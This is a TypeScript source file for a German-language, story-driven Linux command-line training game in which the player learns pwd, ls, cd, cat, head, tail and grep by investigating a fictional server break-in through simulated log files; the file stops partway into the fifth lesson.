/**
 * Learning Mode - "The Awakening" - Progressive CLI Training
 *
 * NARRATIVE: You wake up logged into a remote server. No memory. No context.
 * A quiet senior admin named "Jens" left notes for you. Something happened here.
 * You must learn the tools to uncover the truth... and survive.
 *
 * STRUCTURE:
 * Act 1 (Lessons 1-3): The Awakening - Basic survival
 * Act 2 (Lessons 4-6): The Investigation - Finding clues
 * Act 3 (Lessons 7-8): The Infrastructure - Taking control
 * Act 4 (Lessons 9-11): The Confrontation - Boss battles
 */

import { GameEvent } from '@kritis/shared';

// --- learn_04_grep_hunter: real log files for the VFS -----------------------
// The attack lines must land on exactly the line numbers the level's
// `grep -n "185" auth.log` output claims (47-49, 52, 55), so lines 1-46 are
// routine cron noise. Everything a player greps here matches what the canned
// scenario outputs show.
const grepHunterAuthLogNoise = Array.from({ length: 23 }, (_, i) => {
  const t = i * 5;
  const hh = String(Math.floor(t / 60)).padStart(2, '0');
  const mm = String(t % 60).padStart(2, '0');
  const pid = 2001 + i;
  return (
    `Mar 15 ${hh}:${mm}:01 warm-srv-01 CRON[${pid}]: pam_unix(cron:session): session opened for user root by (uid=0)\n` +
    `Mar 15 ${hh}:${mm}:01 warm-srv-01 CRON[${pid}]: pam_unix(cron:session): session closed for user root`
  );
}).join('\n');

const grepHunterAuthLog = `${grepHunterAuthLogNoise}
Mar 15 02:40:01 warm-srv-01 sshd: Failed password for admin from 185.234.72.15
Mar 15 02:40:03 warm-srv-01 sshd: Failed password for admin from 185.234.72.15
Mar 15 02:40:05 warm-srv-01 sshd: Failed password for admin from 185.234.72.15
Mar 15 02:42:01 warm-srv-01 CRON[3201]: pam_unix(cron:session): session opened for user root by (uid=0)
Mar 15 02:42:01 warm-srv-01 CRON[3201]: pam_unix(cron:session): session closed for user root
Mar 15 02:45:00 warm-srv-01 sshd: Failed password for root from 185.234.72.15
Mar 15 02:45:01 warm-srv-01 CRON[3250]: pam_unix(cron:session): session opened for user root by (uid=0)
Mar 15 02:45:01 warm-srv-01 CRON[3250]: pam_unix(cron:session): session closed for user root
Mar 15 02:47:10 warm-srv-01 sshd: Accepted publickey for root from 185.234.72.15
Mar 15 02:50:01 warm-srv-01 CRON[3320]: pam_unix(cron:session): session opened for user root by (uid=0)
Mar 15 02:50:01 warm-srv-01 CRON[3320]: pam_unix(cron:session): session closed for user root
`;

// syslog: 3 [ALERT] lines, exactly 7 ERROR lines (grep -c "ERROR" → 7), and
// exactly 3 lines containing 185.234 — consistent with the scenario outputs.
const grepHunterSyslog = `Mar 15 00:05:01 warm-srv-01 systemd[1]: Starting Daily apt download activities...
Mar 15 00:05:03 warm-srv-01 systemd[1]: apt-daily.service: Succeeded.
Mar 15 00:17:22 warm-srv-01 kernel: [UFW BLOCK] IN=eth0 OUT= SRC=203.0.113.44 DST=10.0.20.11 PROTO=TCP DPT=23
Mar 15 00:30:01 warm-srv-01 CRON[2211]: (root) CMD (logrotate /etc/logrotate.conf)
Mar 15 00:42:17 warm-srv-01 smartd[801]: Device: /dev/sda, SMART Usage Attribute: 194 Temperature_Celsius changed from 41 to 43
Mar 15 01:02:55 warm-srv-01 backup[3410]: ERROR: snapshot volume nearly full (92%)
Mar 15 01:02:56 warm-srv-01 backup[3410]: ERROR: retrying snapshot in 60s
Mar 15 01:03:56 warm-srv-01 backup[3410]: ERROR: snapshot volume nearly full (92%)
Mar 15 01:03:57 warm-srv-01 backup[3410]: backup job finished with warnings
Mar 15 01:15:09 warm-srv-01 nrpe[1122]: ERROR: Could not read request from client 10.0.20.5, bailing out...
Mar 15 01:30:01 warm-srv-01 CRON[2790]: (root) CMD (command -v debian-sa1 > /dev/null && debian-sa1 1 1)
Mar 15 01:48:33 warm-srv-01 dockerd[990]: ERROR: heartbeat to manager failed: rpc error: context deadline exceeded
Mar 15 02:00:14 warm-srv-01 ntpd[733]: ERROR: kernel reports TIME_ERROR: 0x41: Clock Unsynchronized
Mar 15 02:12:40 warm-srv-01 smartd[801]: Device: /dev/sdb, opened
Mar 15 02:30:01 warm-srv-01 CRON[3105]: (www-data) CMD (php /var/www/jobs/cleanup.php)
Mar 15 02:31:07 warm-srv-01 php[3106]: ERROR: cleanup.php: stale lockfile removed
Mar 15 02:47:13 warm-srv-01 kernel: [ALERT] UNAUTHORIZED_ACCESS from 185.234.72.15
Mar 15 02:47:13 warm-srv-01 sshd: Connection from 185.234.72.15
Mar 15 02:47:13 warm-srv-01 sshd: Accepted key for root from 185.234.72.15
Mar 15 02:47:14 warm-srv-01 kernel: [ALERT] Session terminated: jens
Mar 15 02:47:15 warm-srv-01 kernel: [ALERT] Memory wipe executed
Mar 15 03:01:44 warm-srv-01 systemd[1]: Reloading.
Mar 15 03:15:20 warm-srv-01 smartd[801]: Device: /dev/sda, SMART Usage Attribute: 194 Temperature_Celsius changed from 43 to 41
`;

const grepHunterKernLog = `Mar 15 00:00:07 warm-srv-01 kernel: [    0.000000] Linux version 5.15.0-101-generic (buildd@lcy02-amd64-032)
Mar 15 00:00:07 warm-srv-01 kernel: [    0.004215] DMI: WARM Serverhalle Rack 3 / warm-srv-01
Mar 15 00:17:22 warm-srv-01 kernel: [UFW BLOCK] IN=eth0 OUT= SRC=203.0.113.44 DST=10.0.20.11 PROTO=TCP DPT=23
Mar 15 02:12:40 warm-srv-01 kernel: [ 7912.113355] usb 1-1: new high-speed USB device number 4 using xhci_hcd
`;

const grepHunterAccessLog = `10.0.20.5 - - [15/Mar:01:12:44 +0100] "GET /status HTTP/1.1" 200 512
10.0.20.5 - - [15/Mar:01:42:44 +0100] "GET /status HTTP/1.1" 200 512
203.0.113.44 - - [15/Mar:02:38:51 +0100] "GET /wp-login.php HTTP/1.1" 404 162
203.0.113.44 - - [15/Mar:02:38:52 +0100] "GET /.env HTTP/1.1" 404 162
10.0.20.5 - - [15/Mar:02:42:44 +0100] "GET /status HTTP/1.1" 200 512
`;
// ----------------------------------------------------------------------------

export const learningPathEvents: GameEvent[] = [
  // ============================================
  // ACT 1: THE AWAKENING
  // ============================================

  {
    id: 'learn_01_awakening',
    weekRange: [1, 12],
    probability: 1,
    requiredModes: ['learning'],
    category: 'training',
    involvedCharacters: [],
    title: 'Grundlagen 1: Das Erwachen',
    description: `\`\`\`
╔══════════════════════════════════════════════════════════════╗
║  SYSTEM BOOT... OK                                           ║
║  MEMORY CHECK... CORRUPTED                                   ║
║  USER IDENTITY... UNKNOWN                                    ║
║  LOCATION... UNKNOWN                                         ║
╚══════════════════════════════════════════════════════════════╝
\`\`\`

Du öffnest die Augen. Ein Terminal blinkt vor dir.

Wo bist du? Wer bist du? Du erinnerst dich an nichts.

Nur ein Textfragment flackert kurz auf dem Bildschirm:
\`\`\`
[NACHRICHT VON: jens] "Wenn du das liest, vertrau niemandem.
                        Finde heraus wo du bist. Dann such meine Notizen."
\`\`\`

**Deine erste Aufgabe:**
- \`pwd\` — Finde heraus, WO du bist
- \`ls\` — Schau dich um. Was ist hier?`,
    mentorNote: 'pwd = print working directory. ls = list. Die zwei Befehle, mit denen jede Reise beginnt.',
    choices: [
      {
        id: 'start',
        text: 'Terminal aktivieren...',
        effects: { skills: { linux: 3 } },
        resultText: `\`\`\`
╔══════════════════════════════════════════════════════════════╗
║  LEVEL 1 ABGESCHLOSSEN                                       ║
║  ████████████████████████████████████████ 100%               ║
║                                                              ║
║  NEUE FÄHIGKEITEN FREIGESCHALTET:                           ║
║  [pwd] Wo bin ich?                                           ║
║  [ls]  Was ist hier?                                         ║
╚══════════════════════════════════════════════════════════════╝
\`\`\`

Du weißt jetzt wo du bist: /home/azubi

Ein Ordner namens "geheim" hat deine Aufmerksamkeit erregt...`,
        terminalCommand: true,
      },
    ],
    terminalContext: {
      type: 'linux',
      hostname: '???',
      username: 'azubi',
      currentPath: '/home/azubi',
      vfsOverlay: {
        directories: [
          '/home/azubi/Desktop',
          '/home/azubi/geheim',
          '/home/azubi/logs',
          '/home/azubi/scripts',
        ],
        files: [
          { path: '/home/azubi/.identity', content: 'Name: [REDACTED]\nRole: IT-Azubi\nClearance: NONE\nNote: Memory wipe successful.' },
        ],
      },
      commands: [
        {
          pattern: 'pwd',
          output: `/home/azubi

# Okay... du bist im Home-Verzeichnis von "azubi". Bist DU azubi?`,
          teachesCommand: 'pwd',
          skillGain: { linux: 2 },
        },
        {
          pattern: 'ls',
          output: `Desktop   geheim   logs   scripts

# Interessant... ein Ordner namens "geheim"? Was versteckt sich da?`,
          teachesCommand: 'ls',
          skillGain: { linux: 2 },
        },
        {
          pattern: 'ls -l',
          output: `drwxr-xr-x 2 azubi azubi 4096 Mär 15 09:00 Desktop
drwx------ 2 azubi azubi 4096 Mär 15 03:00 geheim     # <-- Nur du hast Zugriff!
drwxr-xr-x 2 azubi azubi 4096 Mär 15 09:00 logs
drwxr-xr-x 2 azubi azubi 4096 Mär 15 09:00 scripts`,
          skillGain: { linux: 3 },
        },
        {
          pattern: 'ls -la',
          output: `drwxr-xr-x 6 azubi azubi 4096 Mär 15 09:00 .
drwxr-xr-x 3 root  root  4096 Mär 14 08:00 ..
-rw------- 1 azubi azubi   89 Mär 15 02:00 .identity  # <-- Versteckte Datei!
drwxr-xr-x 2 azubi azubi 4096 Mär 15 09:00 Desktop
drwx------ 2 azubi azubi 4096 Mär 15 03:00 geheim
drwxr-xr-x 2 azubi azubi 4096 Mär 15 09:00 logs
drwxr-xr-x 2 azubi azubi 4096 Mär 15 09:00 scripts

# Eine versteckte .identity Datei? Wer hat die um 2 Uhr nachts erstellt?`,
          skillGain: { linux: 3 },
        },
        {
          pattern: 'whoami',
          output: `azubi

# Das System sagt du bist "azubi". Aber stimmt das wirklich?`,
          skillGain: { linux: 1 },
        },
        {
          pattern: 'cat .identity',
          output: `Name: [REDACTED]
Role: IT-Azubi
Clearance: NONE
Note: Memory wipe successful.

# ... Memory wipe?! Was ist hier passiert?!`,
          skillGain: { linux: 2, security: 2 },
        },
      ],
      solutions: [
        {
          commands: ['pwd', 'ls'],
          allRequired: true,
          resultText: 'Orientierung geschafft! Du weißt jetzt wo du bist.',
          skillGain: { linux: 5 },
          effects: { stress: -3 },
        },
      ],
      hints: [
        '🤖 Jens: "Hey, Neuling. Tippe pwd um zu sehen wo du gelandet bist."',
        '🤖 Jens: "Gut. Jetzt ls um zu sehen was hier rumliegt."',
        '🤖 Jens: "Profi-Tipp: ls -la zeigt auch versteckte Dateien. Die fangen mit Punkt an."',
        '🤖 Jens: "Du machst das nicht zum ersten Mal, oder? ...Oder doch?"',
      ],
    },
    tags: ['learning', 'terminal', 'linux', 'level1', 'story'],
  },

  {
    id: 'learn_02_hidden_notes',
    weekRange: [1, 12],
    probability: 1,
    requiredModes: ['learning'],
    requires: { events: ['learn_01_awakening'] },
    category: 'training',
    involvedCharacters: [],
    title: 'Grundlagen 2: Die versteckte Nachricht',
    description: `\`\`\`
[SYSTEM LOG] Letzter Login: azubi @ 02:47 Uhr
[SYSTEM LOG] Aktivität: 47 Dateien gelöscht
[SYSTEM LOG] Notiz hinterlassen in: /home/azubi/geheim/
\`\`\`

Jemand war um 2:47 Uhr hier. Hat 47 Dateien gelöscht.

Aber eine Notiz hinterlassen? In dem "geheim" Ordner?

**Deine Aufgabe:**
- \`cd geheim\` — Geh in den geheimen Ordner
- \`ls -a\` — Zeige ALLE Dateien (auch versteckte!)
- Finde die Nachricht die der vorherige Admin für dich hinterlassen hat`,
    mentorNote: 'cd = change directory. Mit -a siehst du auch Dateien die mit Punkt beginnen (versteckt).',
    choices: [
      {
        id: 'start',
        text: 'In den geheimen Ordner wechseln...',
        effects: { skills: { linux: 3 } },
        resultText: `\`\`\`
╔══════════════════════════════════════════════════════════════╗
║  LEVEL 2 ABGESCHLOSSEN                                       ║
║  ████████████████████████████████████████ 100%               ║
║                                                              ║
║  NEUE FÄHIGKEITEN:                                          ║
║  [cd]    Verzeichnis wechseln                                ║
║  [cd ..] Zurück gehen                                        ║
║  [ls -a] Versteckte Dateien anzeigen                         ║
╚══════════════════════════════════════════════════════════════╝
\`\`\`

Du hast Jens' versteckte Nachricht gefunden!

Er warnt vor jemandem... aber wem? Die Logs könnten mehr verraten.`,
        terminalCommand: true,
      },
    ],
    terminalContext: {
      type: 'linux',
      hostname: 'warm-srv-??',
      username: 'azubi',
      currentPath: '/home/azubi',
      vfsOverlay: {
        directories: ['/home/azubi/geheim'],
        files: [
          {
            path: '/home/azubi/geheim/.jens_nachricht',
            content: `DRINGENDE NACHRICHT - NUR FÜR AZUBI
=====================================
Wenn du das liest, haben sie mir das Gedächtnis gelöscht.
Dir wahrscheinlich auch.

Die Logs in /var/log zeigen was passiert ist.
Lerne grep - du wirst es brauchen.

Vertrau dem Chef nicht. Er arbeitet mit ihnen.

- B.

PS: Mit cat kannst du Dateien lesen.
PPS: Lösch diese Nachricht wenn du sie gelesen hast.`,
          },
          { path: '/home/azubi/geheim/notizen.txt', content: 'Einkaufsliste:\n- Kaffee\n- Mehr Kaffee\n- Noch mehr Kaffee' },
        ],
      },
      commands: [
        {
          pattern: 'cd geheim',
          output: `# Du betrittst den geheimen Ordner...`,
          teachesCommand: 'cd',
          skillGain: { linux: 2 },
        },
        // Put more specific ls variants FIRST (before plain ls)
        {
          patternRegex: '^ls\\s+(-[al]+|--all)',
          pattern: 'ls -a',
          output: `.  ..  .jens_nachricht  notizen.txt

# AHA! Eine versteckte Datei: .jens_nachricht
# Dateien mit Punkt am Anfang sind in Linux "versteckt"`,
          teachesCommand: 'ls -a',
          skillGain: { linux: 3 },
        },
        {
          pattern: 'ls',
          output: `notizen.txt

# Nur eine langweilige Textdatei? Oder versteckt sich hier mehr?`,
          skillGain: { linux: 1 },
        },
        {
          pattern: 'cat .jens_nachricht',
          output: `DRINGENDE NACHRICHT - NUR FÜR AZUBI
=====================================
Wenn du das liest, haben sie mir das Gedächtnis gelöscht.
Dir wahrscheinlich auch.

Die Logs in /var/log zeigen was passiert ist.
Lerne grep - du wirst es brauchen.

Vertrau dem Chef nicht. Er arbeitet mit ihnen.

- B.

PS: Mit cat kannst du Dateien lesen.
PPS: Lösch diese Nachricht wenn du sie gelesen hast.

# ... Wer ist "sie"? Was haben sie getan?`,
          skillGain: { linux: 2, security: 3 },
          isSolution: true,
        },
        {
          pattern: 'cd ..',
          output: `# Zurück ins Home-Verzeichnis`,
          teachesCommand: 'cd ..',
          skillGain: { linux: 2 },
        },
        {
          pattern: 'pwd',
          output: '/home/azubi/geheim',
          skillGain: { linux: 1 },
        },
      ],
      solutions: [
        {
          commands: ['cd', 'ls -a'],
          allRequired: true,
          resultText: 'Du hast die versteckte Nachricht gefunden!',
          skillGain: { linux: 5, security: 2 },
          effects: { stress: -3 },
        },
      ],
      hints: [
        '🤖 Jens: "Wechsle in den Ordner mit cd geheim"',
        '🤖 Jens: "ls zeigt nichts Wichtiges? Versuch mal ls -a für versteckte Dateien."',
        '🤖 Jens: "Siehst du die Datei mit dem Punkt vorne? Die hab ich für dich gelassen."',
        '🤖 Jens: "cat dateiname zeigt den Inhalt. Los, lies meine Nachricht!"',
      ],
    },
    tags: ['learning', 'terminal', 'linux', 'level1', 'story'],
  },

  {
    id: 'learn_03_forensics',
    weekRange: [1, 12],
    probability: 1,
    requiredModes: ['learning'],
    requires: { events: ['learn_02_hidden_notes'] },
    category: 'training',
    involvedCharacters: [],
    title: 'Grundlagen 3: Digitale Forensik',
    description: `\`\`\`
╔══════════════════════════════════════════════════════════════╗
║  ⚠️  WARNUNG: SYSTEMPROTOKOLL BESCHÄDIGT                     ║
║  Letzte intakte Einträge: /home/azubi/logs/system.log        ║
║  Dateigröße: 10.847 Zeilen                                   ║
╚══════════════════════════════════════════════════════════════╝
\`\`\`

Jens sagte, die Logs zeigen, was passiert ist. Mehr sagte er nicht — typisch Jens.

Das Problem: Die Log-Datei hat über 10.000 Zeilen!

Mit \`cat\` würde dein Terminal explodieren. Du brauchst chirurgische Werkzeuge.

**Deine Aufgabe:**
- \`tail system.log\` — Zeige die LETZTEN Einträge (die neuesten!)
- \`head system.log\` — Zeige die ERSTEN Einträge
- Finde den exakten Zeitstempel als "der Eindringling" eingebrochen ist`,
    mentorNote: 'tail = Ende der Datei, head = Anfang. Bei Logs willst du meist tail - das Neueste steht am Ende.',
    choices: [
      {
        id: 'start',
        text: 'Log-Analyse starten...',
        effects: { skills: { linux: 3, troubleshooting: 2 } },
        resultText: `\`\`\`
╔══════════════════════════════════════════════════════════════╗
║  FORENSIK-ANALYSE ABGESCHLOSSEN                              ║
║  ████████████████████████████████████████ 100%               ║
║                                                              ║
║  BEWEIS GESICHERT:                                           ║
║  Zeitstempel: 02:47:13                                       ║
║  Aktivität: UNAUTHORIZED_ACCESS                              ║
║  Quelle: [VERSCHLÜSSELT]                                     ║
╚══════════════════════════════════════════════════════════════╝
\`\`\`

02:47:13 — Jemand hat sich unauthorized Zugang verschafft.

Aber wer? Die IP ist verschlüsselt. Du brauchst grep um mehr zu finden...`,
        terminalCommand: true,
      },
    ],
    terminalContext: {
      type: 'linux',
      hostname: 'warm-srv-01',
      username: 'azubi',
      currentPath: '/home/azubi/logs',
      vfsOverlay: {
        files: [
          {
            path: '/home/azubi/logs/system.log',
            content: `[... 10.000 Zeilen System-Logs ...]
2026-03-15 02:45:00 [INFO] Routine backup started
2026-03-15 02:45:30 [INFO] Backup completed successfully
2026-03-15 02:46:00 [INFO] All systems nominal
2026-03-15 02:47:13 [ALERT] UNAUTHORIZED_ACCESS detected
2026-03-15 02:47:14 [ALERT] User 'jens' session terminated
2026-03-15 02:47:15 [ALERT] Memory wipe initiated for user 'azubi'
2026-03-15 02:47:16 [INFO] New session started: user 'unknown'
2026-03-15 02:48:00 [INFO] 47 files deleted from /evidence
2026-03-15 08:00:00 [INFO] System boot - normal operation`,
          },
        ],
      },
      commands: [
        {
          pattern: 'ls',
          output: `access.log  error.log  system.log

# Die system.log ist die wichtigste.`,
          skillGain: { linux: 1 },
        },
        {
          pattern: 'cat system.log',
          output: `[... WARNUNG: Datei zu groß - 10.847 Zeilen ...]
[... Terminal-Buffer überlastet ...]
[... Letzte 20 Zeilen werden angezeigt ...]

2026-03-15 02:47:13 [ALERT] UNAUTHORIZED_ACCESS detected
2026-03-15 02:47:14 [ALERT] User 'jens' session terminated
[...]

# AUTSCH! Die Datei ist zu groß. Nutze 'tail' oder 'head' für Kontrolle!`,
          skillGain: { linux: 1 },
          wrongApproachFeedback: 'Die Datei ist riesig! Nutze tail für die letzten Zeilen.',
        },
        {
          pattern: 'tail system.log',
          output: `2026-03-15 02:46:00 [INFO] All systems nominal
2026-03-15 02:47:13 [ALERT] UNAUTHORIZED_ACCESS detected     # <-- DA!
2026-03-15 02:47:14 [ALERT] User 'jens' session terminated
2026-03-15 02:47:15 [ALERT] Memory wipe initiated for user 'azubi'
2026-03-15 02:47:16 [INFO] New session started: user 'unknown'
2026-03-15 02:48:00 [INFO] 47 files deleted from /evidence
2026-03-15 08:00:00 [INFO] System boot - normal operation

# 02:47:13 - Der Moment des Einbruchs! Und... Memory Wipe für DICH?!`,
          teachesCommand: 'tail',
          skillGain: { linux: 3, troubleshooting: 3 },
          isSolution: true,
        },
        {
          pattern: 'tail -n 20 system.log',
          output: `2026-03-15 02:45:00 [INFO] Routine backup started
2026-03-15 02:45:30 [INFO] Backup completed successfully
2026-03-15 02:46:00 [INFO] All systems nominal
2026-03-15 02:47:13 [ALERT] UNAUTHORIZED_ACCESS detected
2026-03-15 02:47:14 [ALERT] User 'jens' session terminated
2026-03-15 02:47:15 [ALERT] Memory wipe initiated for user 'azubi'
2026-03-15 02:47:16 [INFO] New session started: user 'unknown'
2026-03-15 02:48:00 [INFO] 47 files deleted from /evidence
2026-03-15 08:00:00 [INFO] System boot - normal operation

# Mit -n 20 siehst du die letzten 20 Zeilen. Präzise!`,
          skillGain: { linux: 2 },
        },
        {
          pattern: 'head system.log',
          output: `2026-03-14 00:00:01 [INFO] System initialized
2026-03-14 00:00:02 [INFO] Loading kernel modules
2026-03-14 00:00:03 [INFO] Network interface eth0 up
2026-03-14 00:00:05 [INFO] SSH service started
2026-03-14 00:01:00 [INFO] User 'jens' logged in

# Der Anfang des Logs. Normale Boot-Sequenz.`,
          teachesCommand: 'head',
          skillGain: { linux: 2 },
        },
        {
          pattern: 'head -n 3 system.log',
          output: `2026-03-14 00:00:01 [INFO] System initialized
2026-03-14 00:00:02 [INFO] Loading kernel modules
2026-03-14 00:00:03 [INFO] Network interface eth0 up

# Mit -n 3 nur die ersten 3 Zeilen.`,
          skillGain: { linux: 2 },
        },
      ],
      solutions: [
        {
          commands: ['tail'],
          allRequired: true,
          resultText: 'Forensik-Analyse erfolgreich! Zeitstempel des Einbruchs: 02:47:13',
          skillGain: { linux: 5, troubleshooting: 5 },
          effects: { stress: -3 },
        },
      ],
      hints: [
        '🤖 Jens: "10.000 Zeilen mit cat? Dein Terminal würde explodieren, Kleiner."',
        '🤖 Jens: "Nutze tail system.log für die letzten Einträge. Da steht das Wichtige."',
        '🤖 Jens: "Mit tail -n 20 siehst du genau 20 Zeilen. Präzision ist alles."',
        '🤖 Jens: "Such nach ALERT oder ERROR. Das sind die interessanten Zeilen."',
      ],
    },
    tags: ['learning', 'terminal', 'linux', 'level1', 'forensics', 'story'],
  },

  // ============================================
  // ACT 2: THE INVESTIGATION
  // ============================================

  {
    id: 'learn_04_grep_hunter',
    weekRange: [1, 12],
    probability: 1,
    requiredModes: ['learning'],
    requires: { events: ['learn_03_forensics'] },
    category: 'training',
    involvedCharacters: [],
    title: 'Grundlagen 4: Der Grep-Jäger',
    description: `\`\`\`
╔══════════════════════════════════════════════════════════════╗
║  ⚡ NEUE FÄHIGKEIT VERFÜGBAR: GREP                           ║
║                                                              ║
║  grep = "Global Regular Expression Print"                    ║
║  Die mächtigste Waffe eines Sysadmins.                       ║
║  Findet Nadeln in Heuhaufen.                                 ║
╚══════════════════════════════════════════════════════════════╝
\`\`\`

Der Eindringling hat Spuren hinterlassen.

Irgendwo in den Logs ist die IP-Adresse versteckt. Aber die Logs sind RIESIG.

Du brauchst ein Skalpell, keine Axt. Du brauchst: **grep**

**Deine Aufgabe:**
- \`grep "ALERT" syslog\` — Finde alle Alarme
- \`grep -c "ERROR" syslog\` — Zähle die Fehler
- Finde heraus wer um 02:47 eingebrochen ist`,
    mentorNote: 'grep durchsucht Dateien nach Mustern. -i = ignore case, -c = count, -n = Zeilennummern',
    choices: [
      {
        id: 'start',
        text: 'Grep-Jagd starten...',
        effects: { skills: { linux: 4, security: 2 } },
        resultText: `\`\`\`
╔══════════════════════════════════════════════════════════════╗
║  GREP-MEISTER FREIGESCHALTET                                 ║
║  ████████████████████████████████████████ 100%               ║
║                                                              ║
║  BEWEIS GEFUNDEN:                                            ║
║  IP: 185.234.72.15                                           ║
║  Origin: RU-BULLETPROOF                                      ║
║  Status: HOSTILE                                             ║
╚══════════════════════════════════════════════════════════════╝
\`\`\`

Du hast die Angreifer-IP gefunden: 185.234.72.15

Russischer Bulletproof-Hoster. Professionelle Hacker.

Aber was haben sie gesucht? Die Pipes werden es verraten...`,
        terminalCommand: true,
      },
    ],
    terminalContext: {
      type: 'linux',
      hostname: 'warm-srv-01',
      username: 'azubi',
      currentPath: '/var/log',
      taskText: `Der Eindringling hat Spuren in /var/log hinterlassen:
1. grep "ALERT" syslog — finde die Alarm-Meldungen
2. grep -c "ERROR" syslog — zähle die Fehler
3. Wer ist um 02:47 eingebrochen? Finde die IP-Adresse.`,
      // Real files back every command: whatever the player greps that isn't a
      // scripted beat below falls through to the shell engine and still shows
      // correct grep output.
      vfsOverlay: {
        directories: ['/var/log/apache2'],
        files: [
          { path: '/var/log/syslog', content: grepHunterSyslog },
          { path: '/var/log/auth.log', content: grepHunterAuthLog },
          { path: '/var/log/kern.log', content: grepHunterKernLog },
          { path: '/var/log/apache2/access.log', content: grepHunterAccessLog },
        ],
      },
      commands: [
        {
          pattern: 'ls',
          output: `apache2  auth.log  kern.log  syslog

# auth.log enthält Login-Versuche. Da müssen wir suchen.`,
        },
        {
          patternRegex: '^grep\\s+["\']?ALERT["\']?\\s+syslog',
          pattern: 'grep "ALERT" syslog',
          output: `Mar 15 02:47:13 warm-srv-01 kernel: [ALERT] UNAUTHORIZED_ACCESS from 185.234.72.15
Mar 15 02:47:14 warm-srv-01 kernel: [ALERT] Session terminated: jens
Mar 15 02:47:15 warm-srv-01 kernel: [ALERT] Memory wipe executed

# Da ist sie! Die IP: 185.234.72.15`,
          skillGain: { linux: 3, security: 2 },
        },
        // Catch common mistake: searching for the alerts in the wrong file.
        // (Only ALERT — every other grep on auth.log is a legitimate search
        // and must show real grep output, not this nudge.)
        {
          patternRegex: '^grep\\s+(-\\w+\\s+)*["\']?ALERT["\']?\\s+auth\\.log',
          pattern: 'grep "ALERT" auth.log',
          output: `# Hmm, in auth.log findest du Login-Versuche, aber nicht die ALERT-Meldungen.
# Die stehen in syslog! Versuch: grep "ALERT" syslog`,
        },
        // Catch typo: ALARM instead of ALERT
        {
          patternRegex: '^grep\\s+["\']?ALARM',
          pattern: 'grep ALARM',
          output: `# Meintest du ALERT? Der richtige Befehl ist: grep "ALERT" syslog`,
        },
        {
          patternRegex: '^grep\\s+["\']?185[\\d.]*["\']?\\s+syslog',
          pattern: 'grep "185.234" syslog',
          output: `Mar 15 02:47:13 warm-srv-01 kernel: [ALERT] UNAUTHORIZED_ACCESS from 185.234.72.15
Mar 15 02:47:13 warm-srv-01 sshd: Connection from 185.234.72.15
Mar 15 02:47:13 warm-srv-01 sshd: Accepted key for root from 185.234.72.15

# Sie hatten einen SSH-Key für ROOT?! Das war ein Insider-Job!`,
          teachesCommand: 'grep',
          skillGain: { linux: 3, security: 3 },
          isSolution: true,
        },
        {
          patternRegex: '^grep\\s+-c\\s+["\']?ERROR["\']?\\s+syslog',
          pattern: 'grep -c "ERROR" syslog',
          output: `7

# 7 Fehler in syslog. Nicht dramatisch.`,
          skillGain: { linux: 2 },
        },
        {
          patternRegex: '^grep\\s+-i\\s+["\']?[Ff][Aa][Ii][Ll][Ee][Dd]["\']?\\s+auth\\.log',
          pattern: 'grep -i "failed" auth.log',
          output: `Mar 15 02:40:01 warm-srv-01 sshd: Failed password for admin from 185.234.72.15
Mar 15 02:40:03 warm-srv-01 sshd: Failed password for admin from 185.234.72.15
Mar 15 02:40:05 warm-srv-01 sshd: Failed password for admin from 185.234.72.15
Mar 15 02:45:00 warm-srv-01 sshd: Failed password for root from 185.234.72.15

# Passwörter probiert — und um 02:45 ist Schluss. Aber der Einbruch war
# 02:47. Wie kamen sie rein? Such mal nach "Accepted".`,
          skillGain: { linux: 3, security: 4 },
        },
        {
          patternRegex: '^grep\\s+(-\\w+\\s+)*["\']?[Aa]ccepted["\']?\\s+auth\\.log',
          pattern: 'grep "Accepted" auth.log',
          output: `Mar 15 02:47:10 warm-srv-01 sshd: Accepted publickey for root from 185.234.72.15

# 02:47:10 — Publickey-Login als ROOT von 185.234.72.15.
# Erst Passwörter raten, dann plötzlich ein SSH-Key?! Das war ein Insider!`,
          teachesCommand: 'grep',
          skillGain: { linux: 3, security: 4 },
          isSolution: true,
        },
        {
          patternRegex: '^grep\\s+-n\\s+["\']?185[\\d.]*["\']?\\s+auth\\.log',
          pattern: 'grep -n "185" auth.log',
          output: `47:Mar 15 02:40:01 warm-srv-01 sshd: Failed password for admin from 185.234.72.15
48:Mar 15 02:40:03 warm-srv-01 sshd: Failed password for admin from 185.234.72.15
49:Mar 15 02:40:05 warm-srv-01 sshd: Failed password for admin from 185.234.72.15
52:Mar 15 02:45:00 warm-srv-01 sshd: Failed password for root from 185.234.72.15
55:Mar 15 02:47:10 warm-srv-01 sshd: Accepted publickey for root from 185.234.72.15

# -n zeigt Zeilennummern. Zeile 55 war der erfolgreiche Einbruch!`,
          skillGain: { linux: 2 },
          isSolution: true,
        },
        {
          patternRegex: '^grep\\s+["\']?185[\\d.]*["\']?\\s+auth\\.log',
          pattern: 'grep "185" auth.log',
          output: `Mar 15 02:40:01 warm-srv-01 sshd: Failed password for admin from 185.234.72.15
Mar 15 02:40:03 warm-srv-01 sshd: Failed password for admin from 185.234.72.15
Mar 15 02:40:05 warm-srv-01 sshd: Failed password for admin from 185.234.72.15
Mar 15 02:45:00 warm-srv-01 sshd: Failed password for root from 185.234.72.15
Mar 15 02:47:10 warm-srv-01 sshd: Accepted publickey for root from 185.234.72.15

# Da ist die ganze Geschichte: 4× Passwort probiert, dann Publickey-Login als ROOT.`,
          teachesCommand: 'grep',
          skillGain: { linux: 3, security: 3 },
          isSolution: true,
        },
      ],
      solutions: [
        {
          commands: ['grep', '185'],
          allRequired: false,
          resultText: 'IP-Adresse des Angreifers identifiziert: 185.234.72.15',
          skillGain: { linux: 5, security: 5, troubleshooting: 3 },
          effects: { stress: -5 },
        },
      ],
      hints: [
        '🤖 Jens: "grep ist dein Freund. grep MUSTER datei durchsucht nach dem Muster."',
        '🤖 Jens: "Such mal nach ALERT oder ERROR in syslog. Da verstecken sich die Probleme."',
        '🤖 Jens: "Mit grep -i ignorierst du Groß/Klein. Praktisch bei failed/FAILED in auth.log."',
        '🤖 Jens: "Du suchst eine IP? Die fängt mit 185 an. Traust du dich?"',
        '🤖 Jens: "Okay, die Lösung: grep 185 syslog — die IP steht direkt in den ALERT-Zeilen."',
      ],
    },
    tags: ['learning', 'terminal', 'linux', 'level2', 'grep', 'story'],
  },

  {
    id: 'learn_05_pipe_filter',
    weekRange: [1, 12],
    probability: 1,
    requiredModes: ['learning'],
    requires: { events: ['learn_04_grep_hunter'] },
    category: 'training',
    involvedCharacters: [],
    title: 'Linux & Services 1: Der Filter',
    description: `\`\`\`
╔══════════════════════════════════════════════════════════════╗
║  ⚡ NEUE FÄHIGKEIT VERFÜGBAR: PIPES                          ║
